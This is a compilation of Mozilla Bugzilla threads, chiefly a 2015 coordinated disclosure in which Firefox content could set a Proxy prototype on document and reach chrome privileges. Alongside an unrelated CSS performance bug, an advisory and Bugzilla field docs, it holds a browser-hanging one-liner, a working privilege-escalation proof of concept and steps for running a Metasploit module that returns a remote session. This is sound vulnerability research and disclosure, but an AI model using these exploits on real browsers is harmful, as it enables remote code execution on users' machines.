| [Description](/show_bug.cgi?id=112026#c0)• 23 years ago |
|  | |

I just finished a new quantify run from a build from last week and I'm seeing a
performance discrepency in nsCSSFrameConstructor::ConstructRootFrame over
previous runs.
During nsCSSFrameConstructor::ConstructRootFrame for the message body, we are
now spending 14.79ms. Compare that to my last run from Monday where we spent
7.76ms in the same routine. The time discrepency is coming from:
StyleSetImpl::FileRules
where we now spend 10.60 ms in nsSupportsArrays::EnumerateForward. This time is
in turn coming from CSSRuleProcessor::GetRuleCascade which is in turn spending
most of it's time calling EnumerateBackwards which calls
RuleHash::AppendRuleToTable. The time there is spent calling new (4.78 ms) and
nsHashTable::Put (3.65ms).

adding hyatt to the cc list since he's the only CSS guru I know. Hey Dave, have
there been any big changes to CSSRuleProcessor in the last week or so? I'm
noticing a large performance regression in CSSRuleProcessor::GetRuleCascade when
parsing a message body.
We went from 1700 calls to CSSRuleProcessor::GetRuleCascade which took 2.17ms to
1400 calls to CSSRuleProcessor::GetRuleCascade which now takes 9ms.
On a side note, I'm suprised that loading an HTML file into the parser has some
1700 odd CSS rules. I wonder where all those rules are coming from. The HTML we
are loading contains one CSS file: messageBody.css but there are around 20 rules
in that file. I assume it also needs to evaluate against html.css which might
have some more. But 1700 looked kind of high.
Anyway, for this bug I'm trying to figure out why GetRuleCascade is suddenly
taking so much time. Status: NEW → ASSIGNEDKeywords: [nsbeta1](/buglist.cgi?keywords=nsbeta1&resolution=---),

Did you add any new stylesheets to the window that you're profiling. That
sounds like it would do this.

But it's one call that takes all the time, right?

one call to nsCSSFrameConstructor::ConstructRootFrame which takes all the time
by delving down and indirectly calling StyleSetImpl::FileRules many times.

FileRules should be called many times, but GetRuleCascade should only be called
once. Was it the time within GetRuleCascade that is bigger, or the time within
FileRules but not within GetRuleCascade, or both?

thanks for your help David. GetRuleCascade is being called 1,453 times, spending
8.64 ms in EnumerateBackwards (which trickles down to FileRules) and an overall
time of 9.02ms. In my previous quantify runs, GetRuleCascade was still called
1786 times with 1.74 ms spent in ::EnumerateBackwards and an overall time of 2.17ms.

When I said GetRuleCascade should only be called once -- I meant it should only
do anything that takes time once.
Could something have started including a stylesheet multiple times via overlays?
Or could there have been some other way you started using more stylesheets?
(What's in the |mSheets| of the CSSRuleProcessor? You could write code to print
it out by calling nsIStyleSheet::GetURI...)

well this may have been a red herring. I just finished a brand new build and ran
quantify on it again and the numbers are back where they should be.
70% of the time in ConstructRootFrame is for creating the scrollframe again like
it should be. This method is no longer dominated by ResolvePseudoStyleContextFor
like it was. GetRuleCascade is still called over 1,000 times though but it was
before this anomoly too. David, are you sure this method should only be called once?
Sorry for wasting everyone's time. Summary: Investiage performance regression in StyleSetImpl::FileRules → Investigate performance regression in StyleSetImpl::FileRules

| [Description](/show_bug.cgi?id=1120261#c0)• 10 years ago |
|  | |

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_9\_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Steps to reproduce:
document.\_\_proto\_\_=Proxy.create({getPropertyDescriptor:function(){ while(1) {} }});
Actual results:
Permanently hangs the browser.
By inserting a console.log call you can see our function gets called all over the place. It does not seem to be able to actually return a value, but I think you can force an error to be thrown in chrome code that prevents the code from continuing. This might lead to unexpected results when initialization code does not run to completion.
Expected results:
I've not figured out the exact problem here, but this should not be able to happen. If anything it can cause a simple DoS. With some creativity it might be able to do more, there are a lot of affected code paths worth exploring.
This issue affects the latest stable release, but seems to be fixed in the nightlies.

Note that the Javascript I posted above must be in a <script> in the document to reproduce the DoS (running from console will not repro the issue).

Not immediately, off the top of my head. Skimming XrayWrapper.cpp filelog doesn't suggest anything in the relevant time frame, either. ([Bug 976148](/show_bug.cgi?id=976148 "RESOLVED FIXED - Implement Xrays to Function objects") would have been my guess, but it's back in June and is targeted [accurately, I believe] at 33.)
Conceivably efaust changed something about prototypes that affected this? Scraping bottom of the barrel here, kind of. Also poking evilpie, who just did an audit of the prototype-accessing spots in our code and might have insight here.Flags: needinfo?(jwalden+bmo)Flags: needinfo?(evilpies)Flags: needinfo?(efaustbmo)

You can abuse this to gain a reference to a chrome:// window. Just run this in webconsole:
var props = {};
props['has'] =function(){ window.x=window.open("chrome://browser/content/browser.xul", "x")();}
document.\_\_proto\_\_=Proxy.create(props)
Then click anywhere on the page. Lots of chrome windows will pop up. `window.x` will be a pointer to a chrome-privileged one.
Will poke around a bit more to see if I can gain full RCE.

Just like in Marius's webidl exploit, you can open the privileged window with the 'chrome' property and navigate it to a data URI, after which the `messageManager` global is accessible to content.
However, unlike the webidl exploit, loading an <iframe> with mozBrowser property into the data:// window does not create a new browser instance, so I am blocked there from RCE (from what I can tell).

Remote code execution PoC (make sure you have the browser console open). You'll see I can access Components.utils.
<script>
var props = {};
props.has = function(){
if (!window.top.x) {
window.top.x=window.open("chrome://browser/content/browser.xul", "x", "chrome");
window.top.x && setTimeout(function(){
x.location='data:text/html,<iframe mozbrowser src="about:blank"></iframe>';
setTimeout(function(){
x.messageManager.loadFrameScript('data:,throw Components.utils', false);
}, 100)
}, 100)
}
}
document.\_\_proto\_\_=Proxy.create(props)
</script>

I couldn't reproduce it on ESR 31.0.4 or Firefox 30. The \_\_proto\_\_ hooking vuln is there (as is the ability to influence chrome code from content), but AFAICT chrome code does not make the right calls into document when the window is clicked. If I log all the args to 'has', I see that Firefox 30 and latest ESR are missing a call to 'getElementById' that is present on 31-34.

Al, think we should consider 31 potentially affected given [comment 17](/show_bug.cgi?id=1120261#c17 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code") - it sounds like the given PoC doesn't work for somewhat circumstantial reasons, but there's a decent chance that somebody could find a similar exploit for 31 if they tried.
Realistically, I don't think we can backport, but we should at least embargo.

I think there may be more defense-in-depth we can do by examining the PoC. I've got it on my list to do sometime in the near future. Keeping the NI for now.

Agreed. Although my RCE attack fails, current ESR is still vulnerable to the \_\_proto\_\_ hooking bug and the originally reported DoS attack, which is a bad symptom. Conceivably someone could abuse it to find a different path to RCE.

Hi Mozilla folks -- I handle vulnerability disclosure a lot here at Rapid7, and Joe (a Rapid7 employee) reported this bug to you on January 20, 2015. According to our disclosure policy (found here: <https://rapid7.com/disclosure.jsp>), we inform CERT/CC 15 days after initial disclosure to the vendor, and then the public 60 days after.
Looking at the release schedules for ESR31 and FF39, it looks like you're planning on fixing and releasing well within the 60 day period, so this shouldn't be a problem for you, but I wanted to be sure you were aware.

I combed through this PoC. It didn't seem to work out of the box on FF34, but I nonetheless extracted a couple of key bugs from it:

This is [bug 987794](/show_bug.cgi?id=987794 "RESOLVED FIXED - named getters can fool Xrays"), as already discussed. This should be fixed on FF35 and up.

This is [bug 1092388](/show_bug.cgi?id=1092388 "RESOLVED FIXED - nsGlobalWindow::SecurityCheckURL can allow content to load restricted URIs"), whereby content can open a chrome window. This should be fixed on FF35 and up.

As best as I can tell, the mozbrowser is not have any affect here, because the principal of this content is unprivileged (and this nsGenericHTMLFrameElement::GetReallyIsBrowserOrApp should be returning false). If I've misunderstood that joe (and the mozbrowser \_does\_ have an effect) please let me know.

I am testing on 34.0.5 on OSX, if that helps. Still have to click, or close a tab, to trigger the bug.

From what I can see the PoC won't work without the `mozbrowser` attribute. Without the mozbrowser attribute:, `x.messageManager.childCount` returns "0", so loading a frame script does not seem to have any effect.

We aren't fixing this issue for ESR31, which doesn't seem actively affected except as a DOS attack, which doesn't meet the criteria for addressing in ESR. This is effectively fixed in Firefox 35 and onwards per [comment 15](/show_bug.cgi?id=1120261#c15 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code"). Our only work here is to do a deeper examination of things to look to see if there are larger issues at play.
I will say that a 60 day windows for public disclosure of a bug is not terribly large. I'd suggest that you change this to at least 90 days, as Google is doing for their Project Zero. We work on a six week (roughly 45 day) product cycle so if this misses a particular release for some reason, you may very well zero day the public because two releases will always take longer than 60 days.

Correction - we are fixing it on two levels for ESR31 (barring unforseen problems during review, approval, and landing) - see [bug 1110614](/show_bug.cgi?id=1110614 "VERIFIED FIXED - Fix for ESR31 in bug 1092388 can be circumvented") and [bug 1125015](/show_bug.cgi?id=1125015 "RESOLVED FIXED - Stop unwrapping XrayWrappers in HasPropertyOnPrototype in ESR31"). These handle the first and second issue described on [comment 24](/show_bug.cgi?id=1120261#c24 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code"). They're ESR31-specific fixes, which is why they didn't show up before.

Yes, but mozbrowsers aren't even enabled on desktop builds, and even when they're enabled, they require a permission on the domain in order to use.
Have you tried reproducing with a fresh Firefox profile? My guess is that you enabled dom.mozBrowserFramesEnabled during testing, and granted the "browser" permission to your test domain. See the logic here:
<http://mxr.mozilla.org/mozilla-central/source/dom/html/nsGenericHTMLFrameElement.cpp#287>
Can you confirm that you did both of those thing? If you didn't, that would be very interesting.

Hrmm, I have no idea how this works then. I don't see that option in my `about:config`, and I have reset my profile several times during testing. I know this same logic also worked in the webidl exploit I reversed from the Mariusz's Pwn2Own bug reports in early 2014, and that was tested on several separate Firefox installs (on several different OSes) in-house here. I'll load up 34 stable in a fresh Ubuntu VM and make sure I can reproduce it there as well.Flags: needinfo?(joev)

Google does 90 days, CERT/CC does 45 (<http://www.cert.org/vulnerability-analysis/vul-disclosure.cfm>), so I feel like a 60 day clock is pretty reasonable. We've held back a week or two before. I'm happy to debate the merits of various disclosure policies, but I doubt this bug report is the right forum.
At any rate, I'm happy to make reasonable delays if you're close to a fix (unlike some disclosures ahem Google ahem apparently). I think I'm misunderstanding your release cycles, and I cannot see [bug 1110614](/show_bug.cgi?id=1110614 "VERIFIED FIXED - Fix for ESR31 in bug 1092388 can be circumvented").
The calendar for disclosure I'm looking at is:
Jan 20, 2015 (Tue): Initial disclosure to the vendor
Feb 04, 2015 (Wed): Disclosure to CERT/CC
Mar 23, 2015 (Mon): Public disclosure
If you need an extra week or two for backports, I'm sure we can accommodate. I'm sure you already have contacts at CERT/CC, so I'd expect you'll get something from them pretty soon after we report there.

Arghh, about 2 hours ago I would have been able to do this. Today is my last day at Rapid7 so I was cleaning up files and deleted my mozilla-central repo. I probably won't be able to set up a dev environment until sometime this weekend, but I can give it a shot then and let you know.

Sorry, ignore this, I am a moron. I was running my msf module as a background job, so that "whoami" command was executing on my local box (where I was running msf as root). \*headdesk\* \*headdesk\*
I downloaded the 31.0 stable release for linux x86-64 from here:

Is this still with the exact code in [comment 13](/show_bug.cgi?id=1120261#c13 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code")? I don't see anything shell-related in there.
Also, I thought you said that it didn't reproduce with 31? Or are you saying that it does reproduce with 31, but \_not\_ with ESR31?

For posterity: I downloaded a FF33 release build (on mac), and ran the PoC in [comment 13](/show_bug.cgi?id=1120261#c13 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code") (with the web console open) and didn't see anything indicating privilege escalation. Given that joe is talking about privilege escalation, his shell code presumably differs in some key ways.
This is important because joe says he's loading a mozbrowser, which is bad and doesn't make sense to me. Hopefully he can help us get to the bottom of this.

Sorry guys, took way longer than I expected to rebuild my dev environment. Replying to comments inline:
> ran the PoC in [comment 13](/show_bug.cgi?id=1120261#c13 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code") (with the web console open) and didn't see anything indicating privilege escalation.
The exception shows up in the Browser Console, iirc it says something about not being able to print a wrapped native (the point being that I can access the privileged Components.utils object).
> Given that joe is talking about privilege escalation, his shell code presumably differs in some key ways.
Yes, sorry, the code I was running there was from a Metasploit module that I had written for this vuln, it injects some xpcom code to simulate a reverse shell payload. The PoC I uploaded here just throws an error that ends up in the Browser Console. Besides the payload they are exactly the same.
I've got the code compiling from the tag GECKO340\_2014112606\_RELBRANCH (make sure to use ccache-3.1 or below). Bobby, you are right, the GetReallyIsBrowserOrApp() method is always bailing for me on the nsGenericHTMLFrameElement::BrowserFramesEnabled() check. However, I still see the same pattern: when `mozbrowser` is used, x.messageManager.childCount is 1. Without it, childCount is 0.
I tracked the bug a bit, it seems like for some reason when the document has a mozbrowser in it, an nsFrameMessageManager is initialized with the `mozilla::dom::ipc::MM\_BROADCASTER` flag set to true, so it gets added as a child. This does not happen when I omit the `mozbrowser` attribute.
I attached the stacktrace. I bounced through the code a bit but did not really make any progress as to \*why\* this happens; I'll dig a bit more when I have time.

The bug starts here in nsFrameLoader::AddTreeItemToTreeOwner:
// Force mozbrowser frames to always be typeContent, even if the
// mozbrowser interfaces are disabled.
nsCOMPtr<nsIDOMMozBrowserFrame> mozbrowser =
do\_QueryInterface(mOwnerContent);
if (mozbrowser) {
bool isMozbrowser = false;
mozbrowser->GetMozbrowser(&isMozbrowser);
isContent |= isMozbrowser;
}
This function is called by nsFrameLoader::MaybeCreateDocShell, and the return value is assigned to mIsTopLevelContent:
mIsTopLevelContent = AddTreeItemToTreeOwner(mDocShell, parentTreeOwner, parentType, docShell);
mIsTopLevelContent is then consulted by EnsureMessageManager(), which bails early when mIsTopLevelContent is false (due to `mozbrowser` not being set on the frame):
if (!mIsTopLevelContent && !OwnerIsBrowserOrAppFrame() && !mRemoteFrame) {
return NS\_OK;
}
EnsureMessageManager then goes on to call InitWithCallback(), which calls AddChildManager().
I am not sure of all the exact ramifications here, but when EnsureMessageManager() does not bail early, the frame's messageManager is added as a child to its parent messageManager, which in the PoC is our ChromeWindow.

Here's how to use the module, if you are not familiar with msf. First, save the exploit to ~/.msf4/modules/exploits/multi/browser/firefox\_proxy\_prototype.rb
# Clone msf somewhere nice
$ git clone git@github.com:rapid7/metasploit-framework.git
$ cd metasploit-framework
# Install ruby
$ rvm install 2.1.5
$ rvm gemset create msf
$ rvm use 2.1.5@msf
# Install gems
$ bundle install --without=db
# Start msf
$ ./msfconsole -n
<snip>
... some errors and garbage ...
</snip>
msf> use exploit/multi/browser/firefox\_proxy\_prototype
msf> set LHOST <YOUR-EXTERNAL-IP>
msf> set SRVHOST 0.0.0.0
msf> run -j
Now open your browser and go to the URL that was printed to the console. Click anywhere on the page. You should get a session in msf. You can attach to this session with the `sessions -i 1` command:

Ah, I see! So this just depends on whether or not we fake being a top-level docshell, and isn't really a case of us exposing stuff to content where we wouldn't otherwise. In particular, I'd imagine that doing window.parent.messageManager without the mozbrowser would give the same result as "window.messageManager" does in the PoC. The real bugs are still the fact that (a) content is loading things in a chrome docshell and (b) we're exposing the message manager based on the docshell type, not by the principal of the page.
Looks like boris reviewed this change in part 1 of [bug 757137](/show_bug.cgi?id=757137 "RESOLVED FIXED - Gaia system app is not a app for the purposes of mozLockOrientation()"). It does seem like it would be better to use some sort of GetReallyIsMozbrowser for the isContent override here, though I'm not sure it's worth fussing about (and certainly isn't security-sensitive). Boris, what do you think?Flags: needinfo?(bobbyholley)

All this code is doing is saying that <html:iframe mozbrowser> is going to be a content-type docshell even if its parent is chrome-type. Just like <xul:iframe type="content">. Or <html:iframe mozframetype="content">.
It's not clear to me why this is a problem, exactly, except insofar as we then allow having a message manager for the toplevel content docshell.Flags: needinfo?(bzbarsky)

Yes, I think we can close this bug. I don't think the mozbrowser thing is actually a problem.Flags: needinfo?(bobbyholley)

Ah, I had a feeling I was missing something obvious. Thanks for explaining! Sounds like mozbrowser is working as expected.

Well, I agree that it's still weird that mozbrowser does anything at all in a build where it's not enabled - it just turns out to be a silly detail. It threw me for a loop too. :-)

Hi all -- just to update, I have a CVE from CERT/CC on this issue: [CVE-2015-0932](https://www.cve.org/CVERecord?id=CVE-2015-0932).
I understand Mozilla has their own stash of CVEs, so if you plan to pull one off the stack for this, please reply here and I'll let CERT/CC know that I can return [CVE-2015-0932](https://www.cve.org/CVERecord?id=CVE-2015-0932) to the unused pool.

Pulling in Dan.
For Mozilla code, we assign our own CVEs. It isn't clear that this bug requires one as it was addressed in other, internally found, fixes. No code was checked in here as a result of this bug and Bobby's [bug 987794](/show_bug.cgi?id=987794 "RESOLVED FIXED - named getters can fool Xrays") with [CVE-2014-8636](https://www.cve.org/CVERecord?id=CVE-2014-8636) was involved.Flags: needinfo?(abillings) → needinfo?(dveditz)

We ended up fixing this for esr31, see [comment 27](/show_bug.cgi?id=1120261#c27 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code"). Not sure whether there's anything else sensitive in this bug.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

### Background

Mozilla Firefox is an open-source web browser and Mozilla Thunderbird an
open-source email client, both from the Mozilla Project. The SeaMonkey
project is a community effort to deliver production-quality releases of
code derived from the application formerly known as the ‘Mozilla
Application Suite’.

### Description

Multiple vulnerabilities have been discovered in Firefox, Thunderbird,
and SeaMonkey. Please review the CVE identifiers referenced below for
details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page or email, possibly resulting in execution of arbitrary code or a
Denial of Service condition. Furthermore, a remote attacker may be able
to perform Man-in-the-Middle attacks, obtain sensitive information, spoof
the address bar, conduct clickjacking attacks, bypass security
restrictions and protection mechanisms, or have other unspecified
impact.

### Workaround

There are no known workarounds at this time.

### Resolution

# Mozilla Foundation Security Advisory 2015-09

## XrayWrapper bypass through DOM objects

Announced
January 13, 2015
Reporter
Bobby Holley, Joe Vennix
Impact
Critical
Products
Firefox, SeaMonkey
Fixed in

* Firefox 35
* SeaMonkey 2.32

### Description

Mozilla developer **Bobby Holley** reported that Document Object
Model (DOM) objects with some specific properties can bypass XrayWrappers. This
can allow web content to confuse privileged code, potentially enabling privilege
escalation.

**Update for February 12, 2015:** Security researcher **Joe Vennix** of Rapid7 also reported another issue caused by this same problem. He discovered that setting a prototype to a proxy object could allow web content to open privileged window with the `chrome` property, allowing for escalation of privilege.

| [Description](/show_bug.cgi?id=987794#c0)• 11 years ago |

I was talking with jorendorff, and started getting worried about DOM objects with named accessors fooling the XrayWrapper by either:
(a) shadowing a native property (i.e. getElementById)
or
(b) shadowing an ES property.
We basically had this issue for cross-origin windows in [bug 860494](/show_bug.cgi?id=860494 "RESOLVED FIXED - Error in tabbrowser's DOMTitleChanged with <iframe name=\"top\">").
I'm getting a bug on file here so that I can write some tests, then we can assess whether it's actually a problem or not.

Shadowing an ES property on which?
The named accessor bits in HTMLDocumentBinding are conditioned on:
if (!(flags & JSRESOLVE\_ASSIGNING) && (!isXray || !HasPropertyOnPrototype(cx, proxy, id))) {

So over Xrays, all DOM proxies act like ones that don't have [OverrideBuiltins], basically.

Oh, and that code was in getOwnPropertyDescriptor. The other key part is this bit in get():

So, thinking about this, this security mechanism doesn't actually work, because content can fool it by simply deleting properties. I'll attach the mochitest-chrome test I was writing up.

Hm. I'd initially thought that we needed [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes") for this, but maybe we don't really. For WebIDL Xrays, we have a proper prototype chain, right? So I guess we can fix this properly when we have both of the following:
\* Window WebIDL (assuming there are no other significant named getters on XPCWN bindings)
\* Xrays to Object.prototype ([bug 987111](/show_bug.cgi?id=987111 "RESOLVED FIXED - Implement Xrays to Object objects")).
Those should both be done this cycle, which means that5

which means that the fix here can ideally land on ESR31. Given that it's sec-moderate, I don't know if we should worry too much about the other stuff.

> \* Window WebIDL
Window's named props over an Xray are already safe, since they don't use the generated handler (because there is none; Window is not a proxy binding) or the classinfo bits. Fo a non-Xray they're handled by the GSP; for an Xray they're done directly in the Xray code, after resolveNativeProperty, so can't shadow it.
> (assuming there are no other significant named getters on XPCWN bindings)
There is a named getter on nsStorage2SH, but it never resolves props if ObjectIsNativeWrapper(cx, obj).
That's the only named getter left on XPCWN bindings.
> \* Xrays to Object.prototype ([bug 987111](/show_bug.cgi?id=987111 "RESOLVED FIXED - Implement Xrays to Object objects")).
Why is this relevant? If we just walk the proto chain of the Xray, we'll make sure we don't shadow any of the standard Object.prototype props, no?

The Xray chain for DOM Xrays leads to contentWindow.Object.prototype, which is currently a transparent wrapper from the Xray side.No longer depends on: [789261](/show_bug.cgi?id=789261 "RESOLVED FIXED - WebIDL bindings for Window")

Ah, so content could still shadow the things that normally live on Object.prototype?
But it can do that without named getters too, just by modifying the values of those props, no?

By deleting properties to defeat the shadowing detection, yes.

No, because without [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes"), we don't actually consider the prototype without resolving Xray properties. But that's a good reason for [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes") to block on Object Xrays, actually. /me marks that.

I'm not following. If I do .toString on an Xray for an HTMLDivElement, say, where is that toString function found right now? Can content affect the function that's found?

Currently, toString is handled as a special-case by Xrays. Other things from Object.prototype (like hasOwnProperty) just resolve to undefined. This will change with [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes") (when we start considering the Xray's prototype chain for lookups). So we need Xrays to contentWindow.Object.prototype before we do that.

Ah, I see.
So another option, btw, is to just make HasPropertyOnPrototype hardcode-return true for the list of built-in Object.prototype properties that we have floating around anyway.

Yes. Though note that the opposite attack still exists - Xrays can be fooled into thinking that a named property isn't there, by having content add arbitrary properties to Object.prototype. This is probably much less problematic FWIW.
I'm going to focus my energy on [bug 987111](/show_bug.cgi?id=987111 "RESOLVED FIXED - Implement Xrays to Object objects"), which I hope to get done this cycle. I'd happily review a patch here in the meantime if you want to write it, though.

Right, content can make named props go away just by changing named/ids.
I don't think it's worth doing something here unless we plan to backport, if you're planning to finish 987111 anyway.

This actually doesn't work, because HasPropertyOnPrototype unwraps XrayWrappers. :-(
I'll try removing that and see what breaks.

Hm. Actually that still isn't enough, because without [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes"), we're not guaranteed a sane prototype chain. Even though we Xray to Document.prototype, we only see that on the proto chain if content hasn't screwed up the prototype in some other way.
So yeah, we really need [bug 787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes") here.Depends on: [787070](/show_bug.cgi?id=787070 "RESOLVED FIXED - Expandos on the xray of DOM prototypes should have effect on xrays of DOM nodes")

Actually, I don't think we can fix this bug as-filed on ESR31. I've filed [bug 1125015](/show_bug.cgi?id=1125015 "RESOLVED FIXED - Stop unwrapping XrayWrappers in HasPropertyOnPrototype in ESR31") to handle the issue relevant to [bug 1120261](/show_bug.cgi?id=1120261 "RESOLVED FIXED - Setting prototype to a Proxy object allows content to influence chrome:// code").

## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

